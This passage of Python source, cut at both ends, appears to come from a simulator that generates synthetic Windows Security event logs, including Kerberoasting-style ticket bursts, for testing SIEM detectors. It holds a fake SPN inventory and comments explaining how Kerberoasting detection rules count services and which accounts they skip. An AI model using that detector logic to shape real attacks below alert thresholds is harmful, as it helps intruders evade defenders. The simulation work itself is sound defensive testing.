        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        f"\tDomain Name:\t\t{d.get('DomainName','')}\r\n"
        f"\tDomain ID:\t\t{d.get('DomainSid','')}\r\n"
        f"\tTrust Attributes:\t{d.get('TdoAttributes','')}\r\n"
        f"\tSID Filtering:\t\t{d.get('SidFilteringEnabled','')}"
    )


def _msg_4865(d):
    return (
        "A trusted forest information entry was added.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        f"\tForest Root:\t\t{d.get('ForestRootSid','')}\r\n"
        f"\tForest Root Domain:\t{d.get('ForestRoot','')}\r\n"
        f"\tOperation ID:\t\t{d.get('OperationId','')}\r\n"
        f"\tEntry Type:\t\t{d.get('EntryType','')}\r\n"
        f"\tFlags:\t\t\t{d.get('Flags','')}\r\n"
        f"\tTop Level Name:\t\t{d.get('TopLevelName','')}\r\n"
        f"\tDNS Name:\t\t{d.get('DnsName','')}\r\n"
        f"\tNetBIOS Name:\t\t{d.get('NetbiosName','')}"
    )


def _msg_4867(d):
    return _msg_4865(d).replace("was added", "was modified")


def _msg_4765(d):
    return (
        "SID History was added to an account.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Source Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('SourceSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SourceUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SourceDomainName','')}"
    )


def _msg_4766(d):
    return _msg_4765(d).replace(
        "SID History was added to an account.",
        "An attempt to add SID History to an account failed.")


def _msg_4928(d):
    return (
        "An Active Directory replica source naming context was established.\r\n\r\n"
        f"\tDestination DRA:\t{d.get('DestinationDRA','')}\r\n"
        f"\tSource DRA:\t\t{d.get('SourceDRA','')}\r\n"
        f"\tSource Address:\t\t{d.get('SourceAddr','')}\r\n"
        f"\tNaming Context:\t\t{d.get('NamingContext','')}\r\n"
        f"\tOptions:\t\t{d.get('Options','')}\r\n"
        f"\tSession ID:\t\t{d.get('SessionID','')}"
    )


def _msg_4929(d):
    return _msg_4928(d).replace("was established", "was removed")


_MSG_BUILDERS = {
    4624: _msg_4624,
    4625: _msg_4625,
    4634: _msg_4634,
    4647: _msg_4647,
    4648: _msg_4648,
    4672: _msg_4672,
    4688: _msg_4688,
    4689: _msg_4689,
    4740: _msg_4740,
    4767: _msg_4767,
    4768: _msg_4768,
    4769: _msg_4769,
    4771: _msg_4771,
    4776: _msg_4776,
    4662: _msg_4662,
    4656: _msg_4656,
    4663: _msg_4663,
    4728: _msg_4728,
    4732: _msg_4732,
    4741: _msg_4741,
    4742: _msg_4742,
    4781: _msg_4781,
    4756: _msg_4756,
    4729: _msg_4729,
    4733: _msg_4733,
    4757: _msg_4757,
    5136: _msg_5136,
    5137: _msg_5137,
    4886: _msg_4886,
    4887: _msg_4887,
    4888: _msg_4888,
    4898: _msg_4898,
    4720: _msg_4720,
    4697: _msg_4697,
    1102: _msg_1102,
    4706: _msg_4706,
    4716: _msg_4716,
    4865: _msg_4865,
    4867: _msg_4867,
    4765: _msg_4765,
    4766: _msg_4766,
    4928: _msg_4928,
    4929: _msg_4929,
    4698: _msg_4698,
    4699: _msg_4699,
    5140: _msg_5140,
    5145: _msg_5145,
    4722: _msg_4722,
    4724: _msg_4724,
    4725: _msg_4725,
    4726: _msg_4726,
    4738: _msg_4738,
}

# 4625 Status/SubStatus → FailureReason mapping.  Status is the primary
# failure code; SubStatus provides additional detail.  The %%xxxx codes are
# Windows parameter insertion strings rendered by Event Viewer.
# (status, sub_status, failure_reason_%%_code)
_FAILURE_REASONS = [
    ("0xC000006D", "0xC000006A", "%%2313"),  # Unknown user name or bad password (bad pw)
    ("0xC000006D", "0xC0000064", "%%2313"),  # Unknown user name or bad password (no user)
    ("0xC000006E", "0xC000006F", "%%2311"),  # Account logon time restriction violation
    ("0xC000006E", "0xC0000070", "%%2312"),  # User not allowed to logon at this computer
    ("0xC000006E", "0xC0000071", "%%2309"),  # Password has expired
    ("0xC000006E", "0xC0000072", "%%2310"),  # Account currently disabled
    ("0xC0000193", "0x0",        "%%2305"),  # Account has expired
    ("0xC0000224", "0x0",        "%%2308"),  # User must change password at next logon
    ("0xC0000234", "0x0",        "%%2307"),  # Account locked out
    ("0xC0000413", "0xC0000413", "%%2304"),  # Authentication firewall refused connection
]

# Kerberos 4771/4768 failure codes (RFC 4120 error numbers, Windows formats
# them as hex).
_KRB_FAILURE_CODES = [
    ("0x6",  "Client not found in Kerberos database"),
    ("0x12", "Client's credentials have been revoked"),
    ("0x17", "Password has expired"),
    ("0x18", "Pre-authentication information was invalid"),
    ("0x25", "Clock skew too great"),
]

# Kerberos TicketEncryptionType values
# 0x01 DES-CBC-CRC     (deprecated/weak)
# 0x03 DES-CBC-MD5     (deprecated/weak)
# 0x11 AES128-CTS-HMAC-SHA1-96
# 0x12 AES256-CTS-HMAC-SHA1-96
# 0x17 RC4-HMAC        (used in Kerberoasting)
# 0x18 RC4-HMAC-EXP    (weak)
_TICKET_ENC_NORMAL = ["0x12", "0x12", "0x12", "0x11", "0x12"]   # almost always AES
_TICKET_ENC_WEAK   = ["0x17", "0x18", "0x01", "0x03"]          # RC4 / DES

# NTLM auth package — Windows always emits this literal string for 4776
_NTLM_PACKAGE = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"

# Kerberos authentication package names used in 4624
_KRB_PACKAGE  = "Kerberos"
_NEG_PACKAGE  = "Negotiate"
_NTLM_PACKAGE_SHORT = "NTLM"

# Common local/system SIDs
_SID_SYSTEM       = "S-1-5-18"
_SID_LOCAL_SERVICE= "S-1-5-19"
_SID_NETWORK_SVC  = "S-1-5-20"
_SID_ANON         = "S-1-0-0"

# Domain RID counter base – synthetic but realistic-looking domain SID prefix
_SYNTH_DOMAIN_SID = "S-1-5-21-3457937927-2839227994-823803824"

# Process names/paths keyed by logon type category.
# Windows uses specific processes for each logon scenario.
# The Security channel is written by LSASS, so its PID is what appears in
# <Execution ProcessID> on every record, and in EventData ProcessId whenever the
# logon-requesting process is LSASS itself. Pinned here so the two never
# disagree, and so one PID never names two different executables (0x248
# previously meant lsass.exe on the DC path and svchost.exe in this table).
_LSASS_PID_HEX = "0x248"
_LSASS_PID_DEC = str(int(_LSASS_PID_HEX, 16))     # 584


def _lsass_pid(computer):
    """LSASS's PID on this host, as (hex, decimal).

    One PID per host for the life of its boot -- that part of the original pinning
    was right -- but it was pinned GLOBALLY, so all 500+ hosts in the estate reported
    lsass at 584 across every one of ~25,000 Security events. A real fleet has a
    different PID per machine, assigned at boot, and anything reasoning about process
    identity saw a single value.

    Derived from the computer name so it is stable for that host across restarts, the
    same guarantee the global constant gave. Windows hands out PIDs in multiples of
    four, and lsass starts early, so the realistic range is a few hundred to ~1500.
    """
    if not computer:
        return _LSASS_PID_HEX, _LSASS_PID_DEC
    digest = hashlib.sha256(f"lsass:{str(computer).lower()}".encode()).digest()
    pid = 500 + (int.from_bytes(digest[:4], "big") % 250) * 4     # 500..1496, x4
    return hex(pid), str(pid)

_LOGON_PROCESSES_BY_TYPE = {
    "interactive": [("0x1d4", "C:\\Windows\\System32\\winlogon.exe"),
                    ("0xb44", "C:\\Windows\\System32\\svchost.exe")],
    "service":     [("0x2f8", "C:\\Windows\\System32\\svchost.exe"),
                    ("0x5f4", "C:\\Windows\\System32\\services.exe")],
    "network":     [(_LSASS_PID_HEX, "C:\\Windows\\System32\\lsass.exe")],
    "unlock":      [("0x1d4", "C:\\Windows\\System32\\winlogon.exe")],
    "remote":      [("0x1d4", "C:\\Windows\\System32\\winlogon.exe")],
    "cached":      [("0x1d4", "C:\\Windows\\System32\\winlogon.exe")],
}
_LOGON_PROCESSES_DEFAULT = [(_LSASS_PID_HEX, "C:\\Windows\\System32\\lsass.exe")]

# LogonProcessName values Windows emits for various scenarios
_LOGON_PROCESS_NAMES = {
    "interactive":        ["User32 ", "Advapi  "],
    "network":            ["NtLmSsp ", "Kerberos"],
    "remote":             ["User32 ", "Advapi  "],
    "cached":             ["Advapi  "],
    "service":            ["Advapi  "],
    "unlock":             ["User32 "],
}

# Known service account and computer account name patterns
_SERVICE_ACCOUNT_SPNS = [
    "MSSQLSvc/sql01.examplecorp.local:1433",
    "MSSQLSvc/sql02.examplecorp.local:1433",
    "MSSQLSvc/sql03.examplecorp.local:1433",
    "MSSQLSvc/reportserver.examplecorp.local",
    "MSSQLSvc/crmdb.examplecorp.local:1433",
    "MSSQLSvc/datawarehouse.examplecorp.local:1433",
    "HTTP/intranet.examplecorp.local",
    "HTTP/sharepoint.examplecorp.local",
    "HTTP/jenkins.examplecorp.local",
    "HTTP/confluence.examplecorp.local",
    "HTTP/jira.examplecorp.local",
    "HTTP/gitlab.examplecorp.local",
    "HTTP/exchange.examplecorp.local",
    "LDAP/dc01.examplecorp.local",
    "LDAP/dc02.examplecorp.local",
    "cifs/fs01.examplecorp.local",
    "cifs/fs02.examplecorp.local",
    "cifs/backup01.examplecorp.local",
    "TERMSRV/rdp-gw01.examplecorp.local",
    "TERMSRV/rdp-gw02.examplecorp.local",
    "WSMAN/mgmt01.examplecorp.local",
    "exchangeMDB/exchange01.examplecorp.local",
    "SAPService/sap01.examplecorp.local",
]

_SERVICE_ACCOUNT_SAMS = [
    "svc_sql_prod",   "svc_sql_dev",   "svc_iis",   "svc_sharepoint",
    "svc_backup",     "svc_monitoring","svc_jenkins","svc_reporting",
    "svc_crm",        "svc_etl",
]

_SPN_TO_SERVICE_ACCOUNT = {
    "MSSQLSvc/sql01.examplecorp.local:1433":      "svc_sql_prod",
    "MSSQLSvc/sql02.examplecorp.local:1433":      "svc_sql_dev",
    "MSSQLSvc/sql03.examplecorp.local:1433":      "svc_sql_prod",
    "MSSQLSvc/reportserver.examplecorp.local":     "svc_reporting",
    "MSSQLSvc/crmdb.examplecorp.local:1433":       "svc_crm",
    "MSSQLSvc/datawarehouse.examplecorp.local:1433":"svc_etl",
    "HTTP/intranet.examplecorp.local":             "svc_iis",
    "HTTP/sharepoint.examplecorp.local":           "svc_sharepoint",
    "HTTP/jenkins.examplecorp.local":              "svc_jenkins",
    "HTTP/confluence.examplecorp.local":           "svc_iis",
    "HTTP/jira.examplecorp.local":                 "svc_iis",
    "HTTP/gitlab.examplecorp.local":               "svc_iis",
    "HTTP/exchange.examplecorp.local":             "svc_iis",
    "exchangeMDB/exchange01.examplecorp.local":    "svc_iis",
    "SAPService/sap01.examplecorp.local":          "svc_crm",
    "WSMAN/mgmt01.examplecorp.local":              "svc_monitoring",
}


# Kerberoastable SPN inventory used by the volume-based Kerberoasting generator.
# Two properties matter to the XSIAM Identity Analytics detectors
# ("A user requested multiple service tickets" / "A user received multiple weakly
# encrypted service tickets"), both of which count DISTINCT services associated
# with *user* accounts per requesting user:
#   1. every SPN maps 1:1 to its own service account, so N tickets == N distinct
#      ServiceName values (the benign _SERVICE_ACCOUNT_SPNS pool is many-to-one
#      and collapses 23 SPNs down to 9 accounts);
#   2. no entry resolves to a computer account — every published 4769
#      Kerberoasting rule discards ServiceName values ending in "$".
_KERBEROAST_SERVICE_ACCOUNTS = [
    ("svc_mssql_fin",     "MSSQLSvc/fin-sql01.examplecorp.local:1433"),
    ("svc_mssql_hr",      "MSSQLSvc/hr-sql01.examplecorp.local:1433"),
    ("svc_mssql_crm",     "MSSQLSvc/crm-sql01.examplecorp.local:1433"),
    ("svc_mssql_erp",     "MSSQLSvc/erp-sql01.examplecorp.local:1433"),
    ("svc_mssql_dw",      "MSSQLSvc/dw-sql01.examplecorp.local:1433"),
    ("svc_mssql_rpt",     "MSSQLSvc/rpt-sql01.examplecorp.local:1433"),
    ("svc_mssql_dev",     "MSSQLSvc/dev-sql01.examplecorp.local:1433"),
    ("svc_mssql_qa",      "MSSQLSvc/qa-sql01.examplecorp.local:1433"),
    ("svc_mssql_stage",   "MSSQLSvc/stg-sql01.examplecorp.local:1433"),
    ("svc_mssql_arch",    "MSSQLSvc/arch-sql01.examplecorp.local:1433"),
    ("svc_oracle_fin",    "oracle/fin-ora01.examplecorp.local:1521"),
    ("svc_oracle_erp",    "oracle/erp-ora01.examplecorp.local:1521"),
    ("svc_postgres_app",  "postgres/app-pg01.examplecorp.local:5432"),
    ("svc_iis_intranet",  "HTTP/intranet-app.examplecorp.local"),
    ("svc_iis_portal",    "HTTP/portal.examplecorp.local"),
    ("svc_iis_extranet",  "HTTP/extranet.examplecorp.local"),
    ("svc_sp_prod",       "HTTP/sp-prod.examplecorp.local"),
    ("svc_sp_dr",         "HTTP/sp-dr.examplecorp.local"),
    ("svc_jenkins_build", "HTTP/jenkins-build.examplecorp.local"),
    ("svc_jenkins_deploy","HTTP/jenkins-deploy.examplecorp.local"),
    ("svc_gitlab_web",    "HTTP/gitlab-web.examplecorp.local"),
    ("svc_gitlab_runner", "HTTP/gitlab-runner.examplecorp.local"),
    ("svc_confluence",    "HTTP/confluence-app.examplecorp.local"),
    ("svc_jira",          "HTTP/jira-app.examplecorp.local"),
    ("svc_bamboo",        "HTTP/bamboo.examplecorp.local"),
    ("svc_nexus",         "HTTP/nexus.examplecorp.local"),
    ("svc_artifactory",   "HTTP/artifactory.examplecorp.local"),
    ("svc_grafana",       "HTTP/grafana.examplecorp.local"),
    ("svc_kibana",        "HTTP/kibana.examplecorp.local"),
    ("svc_splunk_web",    "HTTP/splunk-web.examplecorp.local"),
    ("svc_tableau",       "HTTP/tableau.examplecorp.local"),
    ("svc_powerbi_gw",    "HTTP/pbi-gateway.examplecorp.local"),
    ("svc_adfs_farm",     "HTTP/adfs-farm.examplecorp.local"),
    ("svc_wsus",          "HTTP/wsus.examplecorp.local"),
    ("svc_sccm_mp",       "HTTP/sccm-mp.examplecorp.local"),
    ("svc_vcenter",       "HTTP/vcenter.examplecorp.local"),
    ("svc_netapp_mgmt",   "HTTP/netapp-mgmt.examplecorp.local"),
    ("svc_nessus_scan",   "HTTP/nessus.examplecorp.local"),
    ("svc_exchange_ews",  "HTTP/ews.examplecorp.local"),
    ("svc_exchange_owa",  "HTTP/owa.examplecorp.local"),
    ("svc_exchange_ab",   "exchangeAB/exch-ab01.examplecorp.local"),
    ("svc_exchange_rfr",  "exchangeRFR/exch-rfr01.examplecorp.local"),
    ("svc_exchange_mdb",  "exchangeMDB/exch-mdb01.examplecorp.local"),
    ("svc_sap_prod",      "SAPService/sap-prod01.examplecorp.local"),
    ("svc_sap_dev",       "SAPService/sap-dev01.examplecorp.local"),
    ("svc_termsrv_farm",  "TERMSRV/rds-farm01.examplecorp.local"),
    ("svc_termsrv_gw",    "TERMSRV/rds-gw01.examplecorp.local"),
    ("svc_wsman_mgmt",    "WSMAN/wsman-mgmt01.examplecorp.local"),
    ("svc_wsman_auto",    "WSMAN/wsman-auto01.examplecorp.local"),
    ("svc_ftp_edi",       "ftp/edi-ftp01.examplecorp.local"),
    ("svc_smtp_relay",    "SMTP/smtp-relay01.examplecorp.local"),
    ("svc_ldap_proxy",    "ldap/ldap-proxy01.examplecorp.local"),
    ("svc_kafka",         "kafka/kafka01.examplecorp.local:9092"),
    ("svc_mongodb",       "mongodb/mongo01.examplecorp.local:27017"),
    ("svc_rabbitmq",      "amqp/mq01.examplecorp.local:5672"),
    ("svc_veeam_backup",  "VeeamBackupSvc/veeam01.examplecorp.local"),
]

_KERBEROAST_SPNS = [spn for _acct, spn in _KERBEROAST_SERVICE_ACCOUNTS]

# Register the 1:1 mapping so _build_4769 resolves ServiceName for these SPNs
# without polluting the benign _SERVICE_ACCOUNT_SPNS pool used by normal traffic.
_SPN_TO_SERVICE_ACCOUNT.update(
    {spn: acct for acct, spn in _KERBEROAST_SERVICE_ACCOUNTS})


# Per-process mutable state

# _OPEN_SESSIONS:  hostname → list of open session dicts
#   { "logon_id":"0x...", "target_user_sid":"...", "target_user_name":"...",
#     "target_domain":"...", "logon_type":2, "ip":"10.0.0.5",
#     "workstation":"WKSX", "start":<epoch seconds>,
#     "auth_package":"Kerberos" }
_OPEN_SESSIONS: dict[str, list] = {}

# _FAIL_COUNTS:  username → count of consecutive 4625/4771 failures since
# the last success.  Used to time lockouts.
_FAIL_COUNTS: dict[str, int] = {}

# Monotonically increasing RecordNumber counters, per source host.
_RECORD_NUMBERS: dict[str, int] = {}

# Stable user SIDs derived from the username so the same user always gets the
# same SID across events/restarts (mirrors how real AD assigns RIDs).
_USER_SIDS: dict[str, str] = {}

# Thread safety: the simulator runs modules in parallel threads.
_STATE_LOCK = threading.Lock()

# --- Parallel host mode infrastructure ---
_output_queue: _queue_mod.Queue = _queue_mod.Queue(maxsize=1000)
_status_queue: _queue_mod.Queue = _queue_mod.Queue(maxsize=200)
# Threats travel apart from benign traffic. They used to share _output_queue with ~266
# benign workers that kept it permanently full, so a threat's put() timed out part-way:
# the rest of that threat was lost and -- its fire time already advanced -- never
# retried. Measured 2026-10-06 over 3.5 days: 8.16M Windows events dropped, and Windows
# fired 20 threats while every other module fired 42. Each entry here is ONE whole
# threat, (name, items), and generate_log() drains this queue before benign traffic.
_threat_queue: _queue_mod.Queue = _queue_mod.Queue(maxsize=100)


def _put_backpressured(q, item, stop_event):
    """Wait for room instead of dropping. The drain in generate_log() is the real rate
    limit (50 events per call, one call per second), so a full queue means "generate
    slower", not "throw events away": workers block here and generation settles at
    what can actually be delivered. Returns False only when the simulator is stopping."""
    while not stop_event.is_set():
        try:
            q.put(item, timeout=1.0)
            return True
        except _queue_mod.Full:
            continue
    return False
_worker_stats: dict = {}
_orchestrator_started = False
_orchestrator_lock = threading.Lock()
_workers_stop = threading.Event()


# ── Time-ordered release: record ids follow time ─────────────────────────────────────
# A real host assigns EventRecordID when it writes the event, so per channel the ids
# rise with time. The workers used to build a whole sequence at once (ids taken then)
# and ship it immediately, with timestamps spread over seconds to minutes -- so ~16%
# of a host's consecutive ids ran backwards in time. Workers now build events with a
# placeholder id and SCHEDULE them; one release thread hands each event out when its
# timestamp arrives and assigns the real id at that moment. A sequence that would
# start in the past is shifted to start now (gaps kept), so nothing is released out
# of time order and nothing is ever stamped in the future.
#
# Only the worker threads defer. Scenario events, the harness and other direct callers
# of the generator tables run on other threads and stay immediate (ids at build).
_DEFER_IDS = threading.local()          # .on is True only inside worker threads
_RID_PENDING = "@rid:"                  # placeholder record_id, "@rid:<counter key>"
_release_heap: list = []                # (ts, seq, threat_group|None, threat_name, record)
_release_cond = threading.Condition()
_release_seq = itertools.count()
_RELEASE_MAX_PENDING = 200_000          # schedulers wait above this (memory bound)
_PUBLISH_KEY = "@publish"               # heap entry that publishes a logon to the activity bus
# Events handed to the queues per releaser pass. Unbounded, the first pass after start
# took every due event (thousands) before delivering any; with the dashboard's other
# modules saturating the GIL that pass ran for minutes and Windows delivered nothing.
_RELEASE_CHUNK = 2000


def _deferring() -> bool:
    return getattr(_DEFER_IDS, "on", False)


def _schedule(items, stop_event, threat_name=None) -> bool:
    """Queue one generator result for release at its own timestamps. A threat's
    events share a group, so only its first released chunk carries its name (the
    dashboard counts one threat per labelled chunk). False only when stopping."""
    publishes = getattr(_DEFER_IDS, "publish", None) or []
    _DEFER_IDS.publish = None
    recs = [json.loads(i) if isinstance(i, str) else i for i in items if i]
    if not recs:
        for u in publishes:
            _publish_now(u)
        return True
    times = [_parse_iso_ts(r["time_created"]) for r in recs]
    shift = max(0.0, time.time() - min(times))       # never start in the past
    group = next(_release_seq) if threat_name else None
    with _release_cond:
        while len(_release_heap) >= _RELEASE_MAX_PENDING and not stop_event.is_set():
            _release_cond.wait(timeout=1.0)
        if stop_event.is_set():
            return False
        for r, t in zip(recs, times):
            if shift:
                r["time_created"] = _iso_ts(t + shift)
            heapq.heappush(_release_heap, (t + shift, next(_release_seq), group, threat_name, r))
        # Session starts go out with the result's last event (see _publish_logon).
        end = max(times) + shift
        for u in publishes:
            heapq.heappush(_release_heap, (end, next(_release_seq), None, None, {_PUBLISH_KEY: u}))
        _release_cond.notify_all()
    return True


def _releaser(stop_event):
    """Single release thread: pops events whose time has come, in time order, assigns
    their record ids, and feeds the queues generate_log() drains."""
    labelled = set()
    while not stop_event.is_set():
        with _release_cond:
            now = time.time()
            due = []
            while (_release_heap and _release_heap[0][0] <= now
                   and len(due) < _RELEASE_CHUNK):
                due.append(heapq.heappop(_release_heap))
            if not due:
                wait = (_release_heap[0][0] - now) if _release_heap else 1.0
                _release_cond.wait(timeout=min(1.0, max(0.01, wait)))
                continue
            _release_cond.notify_all()                   # room for waiting schedulers
        _reserve_missing_blocks({str(r.get("record_id", ""))[len(_RID_PENDING):]
                                 for _t, _s, _g, _n, r in due
                                 if str(r.get("record_id", "")).startswith(_RID_PENDING)})
        benign, threats = [], {}
        for _ts, _seq, group, name, r in due:            # release order == time order
            if _PUBLISH_KEY in r:
                _publish_now(r[_PUBLISH_KEY], ts=_ts)
                continue
            rid = str(r.get("record_id", ""))
            if rid.startswith(_RID_PENDING):
                r["record_id"] = str(_next_record_number(rid[len(_RID_PENDING):]))
            line = json.dumps(r)
            if group is not None and group not in labelled:
                threats.setdefault(group, (name, []))[1].append(line)
            else:
                benign.append(line)
        for group, (name, lines) in threats.items():
            labelled.add(group)
            if not _put_backpressured(_threat_queue, (name, lines), stop_event):
                return
        for line in benign:
            if not _put_backpressured(_output_queue, line, stop_event):
                return

# Worker threads used to swallow every exception, so a generator that raised on
# every call simply produced nothing -- no log line, no counter, no clue.  These
# run in a loop, so failures are counted and reported at most once per interval
# per worker rather than on every tick.
_worker_errors: dict = {}
_WORKER_WARN_EVERY_S = 60.0

# Threat labels now travel with the threat itself on _threat_queue; _status_queue is
# advisory only (get_status_events), bounded, and drops when nobody reads it.
# Observers should use this non-destructive ring (get_recent_threats).
_recent_threats: collections.deque = collections.deque(maxlen=25)


# Rate limiting is GLOBAL per kind, not per worker.  There is one worker per
# workstation -- hundreds of them -- so a per-worker window meant a saturated
# output queue printed once per worker and buried the console.  Counts stay
# per-worker (the health check reports the worst offender); only the printing
# is aggregated.
_worker_warn_last = {"error": 0.0, "drop": 0.0}


def _note_worker_error(where, exc, dropped=False):
    now = time.time()
    kind = "drop" if dropped else "error"
    with _STATE_LOCK:
        rec = _worker_errors.setdefault(
            where, {"count": 0, "drops": 0, "last": None})
        if dropped:
            rec["drops"] += 1
        else:
            rec["count"] += 1
            rec["last"] = f"{type(exc).__name__}: {exc}"[:200]
        due = now - _worker_warn_last[kind] >= _WORKER_WARN_EVERY_S
        if due:
            _worker_warn_last[kind] = now
        tot_err = sum(v["count"] for v in _worker_errors.values())
        tot_drop = sum(v["drops"] for v in _worker_errors.values())
        n_workers = sum(1 for v in _worker_errors.values()
                        if (v["drops"] if dropped else v["count"]))
        last = rec["last"]
    if due:
        if dropped:
            print(f"[windows] output queue saturated — {tot_drop} event(s) dropped "
                  f"across {n_workers} worker(s); generation is outpacing the drain "
                  f"in generate_log()")
        else:
            print(f"[windows] generator errors — {tot_err} across {n_workers} "
                  f"worker(s); latest {where}: {last}")


def reset_state():
    """Reset module-level mutable state to its initial values.

    Called by the deterministic Training-Mode engine before a seeded run so that
    a long-lived process (e.g. the dashboard running both the morning bulk stage
    and the afternoon live stream) reproduces identical content each run instead
    of carrying over monotonic counters (RecordNumber, last threat time, etc.).
    """
    global last_threat_event_time, _BUILD_EVENT_OS_SUBTYPE, _orchestrator_started
    with _RECORD_LOCK:
        _RECORD_NUMBERS.clear()
        _RECORD_RESERVED.clear()
        _RECORD_NUMBERS_HERMETIC.clear()
    with _STATE_LOCK:
        _USER_SIDS.clear()
    with _release_cond:
        _release_heap.clear()           # scheduled-but-unreleased events of the last run
    last_threat_event_time = 0
    _BUILD_EVENT_OS_SUBTYPE = "Windows 10"
    _orchestrator_started = False


def _stable_user_sid(username: str) -> str:
    """Deterministic domain SID for a username (last-RID from hash)."""
    with _STATE_LOCK:
        sid = _USER_SIDS.get(username)
        if sid:
            return sid
        h = hashlib.sha1(username.encode()).digest()
        rid = 1100 + (int.from_bytes(h[:4], "big") % 8_900)
        sid = f"{_SYNTH_DOMAIN_SID}-{rid}"
        _USER_SIDS[username] = sid
        return sid


def _local_admin_sid(hostname: str) -> str:
    """Deterministic machine-local SID for the built-in Administrator (RID 500).

    A domain-joined box's local Administrator is S-1-5-21-<machine SID>-500,
    which is a *different* SID from the domain account of the same name. The
    three sub-authorities are derived from the hostname so every host keeps a
    stable, distinct machine SID.
    """
    h = hashlib.sha1(hostname.upper().encode()).digest()
    a = int.from_bytes(h[0:4], "big") & 0x7FFFFFFF
    b = int.from_bytes(h[4:8], "big") & 0x7FFFFFFF
    c = int.from_bytes(h[8:12], "big") & 0x7FFFFFFF
    return f"S-1-5-21-{a}-{b}-{c}-500"


# --- Record numbers that never go backwards --------------------------------------------
# A real host's Security log RecordNumber only ever increases. These used to be reseeded
# with random.randint(50_000, 500_000) on every restart, so a restart could drop a host
# back into a range it had already used -- and the tenant stores ~13.5% fewer Windows
# events than the broker accepts (measured 2026-10-06), uniformly across event types, while
# brand-new test hosts and a real Windows host on the same broker lose nothing. Reuse of
# (host, record id) is the leading explanation; persisting the counter tests it.
#
# IDs are taken in RESERVED BLOCKS from state/windows_record_numbers.json under a lock
# shared between processes (the simulator and a sweep script can run at once): a process
# claims the next block before using any of it, so concurrent processes get disjoint
# ranges and a crash leaves a harmless gap, never a reuse. A host seen for the first time
# starts at >= 1e9, above anything the old random seeding plus days of use could reach.
_RECORD_STATE_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                  "state", "windows_record_numbers.json")
_RECORD_BLOCK = 10_000
_RECORD_FIRST_SEED = 1_000_000_000
_RECORD_RESERVED: dict[str, int] = {}      # host -> end of the block THIS process holds
# Record numbers have their own lock. They used to share _STATE_LOCK, which every worker
# takes for SIDs, open sessions and fail counts, so the releaser -- the one thread that
# numbers worker events, once per event -- queued behind 265 workers for each id.
_RECORD_LOCK = threading.Lock()


class _StateFileLock:
    """Cross-process lock: an O_EXCL lock file, broken if it outlives a crash."""

    def __init__(self, path, stale_after=15.0):
        self.path, self.stale_after = path + ".lock", stale_after

    def __enter__(self):
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        deadline = time.time() + 30
        while True:
            try:
                os.close(os.open(self.path, os.O_CREAT | os.O_EXCL | os.O_WRONLY))
                return self
            except FileExistsError:
                try:
                    if time.time() - os.path.getmtime(self.path) > self.stale_after:
                        os.remove(self.path)       # holder died mid-reservation
                        continue
                except OSError:
                    continue
                if time.time() > deadline:
                    raise TimeoutError(f"record-number lock held too long: {self.path}")
                time.sleep(0.01)

    def __exit__(self, *exc):
        try:
            os.remove(self.path)
        except OSError:
            pass


def _reserve_missing_blocks(hosts):
    """Reserve blocks for every host in *hosts* that has none yet, in ONE state-file
    write. Hosts first seen by the releaser used to reserve one by one (a lock file and
    a JSON rewrite each), 265 of them on a fresh start."""
    if _in_hermetic_run():
        return
    with _RECORD_LOCK:
        need = [h for h in hosts if h and h not in _RECORD_RESERVED]
        if len(need) < 2:
            return                       # _next_record_number handles a single host
        with _StateFileLock(_RECORD_STATE_PATH):
            try:
                with open(_RECORD_STATE_PATH, encoding="utf-8") as f:
                    state = json.load(f)
            except (OSError, ValueError):
                state = {}
            starts = {}
            for host in need:
                saved = state.get(host)
                start = int(saved) if saved is not None else _RECORD_FIRST_SEED + random.randint(0, 50_000_000)
                cur = _RECORD_NUMBERS.get(host)
                if cur is not None:
                    start = max(start, cur)
                state[host] = start + _RECORD_BLOCK
                starts[host] = start
            tmp = _RECORD_STATE_PATH + f".{os.getpid()}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(state, f)
            for attempt in range(40):
                try:
                    os.replace(tmp, _RECORD_STATE_PATH)
                    break
                except PermissionError:
                    if attempt == 39:
                        raise
                    time.sleep(0.025)
        for host, start in starts.items():
            _RECORD_RESERVED[host] = start + _RECORD_BLOCK
            _RECORD_NUMBERS[host] = start


def _reserve_record_block(host, cur):
    """Claim the next block of record numbers for `host`; returns the id before it."""
    with _StateFileLock(_RECORD_STATE_PATH):
        try:
            with open(_RECORD_STATE_PATH, encoding="utf-8") as f:
                state = json.load(f)
        except (OSError, ValueError):
            state = {}
        saved = state.get(host)
        start = int(saved) if saved is not None else _RECORD_FIRST_SEED + random.randint(0, 50_000_000)
        if cur is not None:
            start = max(start, cur)
        state[host] = start + _RECORD_BLOCK
        tmp = _RECORD_STATE_PATH + f".{os.getpid()}.tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(state, f)
        # On Windows, replacing a file another process holds open (Defender or the
        # search indexer scanning the copy just written) fails with WinError 5 for a
        # few milliseconds. Seen once in ~23k events; retry rather than fail the event.
        for attempt in range(40):
            try:
                os.replace(tmp, _RECORD_STATE_PATH)
                break
            except PermissionError:
